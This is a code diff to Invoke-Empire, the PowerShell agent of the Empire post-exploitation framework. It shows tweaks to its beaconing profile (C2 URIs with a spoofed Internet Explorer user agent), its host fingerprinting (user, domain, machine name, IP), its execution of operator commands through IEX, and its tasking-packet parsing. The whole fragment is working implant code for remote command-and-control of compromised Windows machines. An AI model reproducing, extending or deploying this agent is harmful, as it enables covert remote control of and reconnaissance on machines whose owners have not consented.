@@ -72,7 +72,7 @@ function Invoke-Empire {
         $WorkingHours,
 
         [String]
-        $Profile = '/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
+        $Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
 
         [Int32]
         $LostLimit = 60,
@@ -222,7 +222,7 @@ function Invoke-Empire {
         $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
         $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
         $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
-        if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
+        #if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
         $str+="|$ip"
 
         $str += '|' +(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
@@ -265,6 +265,7 @@ function Invoke-Empire {
             # if we have a straight 'shell' command, skip the aliases
             if ($cmdargs.length -eq '') { $output = 'no shell command supplied' }
             else { $output = IEX "$cmdargs" }
+            $output += "`n`r..Command execution completed."
         }
         else {
             switch -regex ($cmd) {
@@ -369,6 +370,7 @@ function Invoke-Empire {
                             $out | Add-Member Noteproperty 'Metric' $_.Metric1
                             $out
                         } | ft -autosize | Out-String
+                        
                     }
                     else { $output = route $cmdargs }
                 }
@@ -991,7 +993,7 @@ function Invoke-Empire {
             $TaskID = $Decoded[3]
             $Length = $Decoded[4]
             $Data = $Decoded[5]
-
+            if ($Decoded.Count -eq 7) {$Remaining = $Decoded[6]}
             # process the new sub-packet and add it to the result set
             $ResultPackets += $(Process-Tasking $Type $Data $TaskID)
 
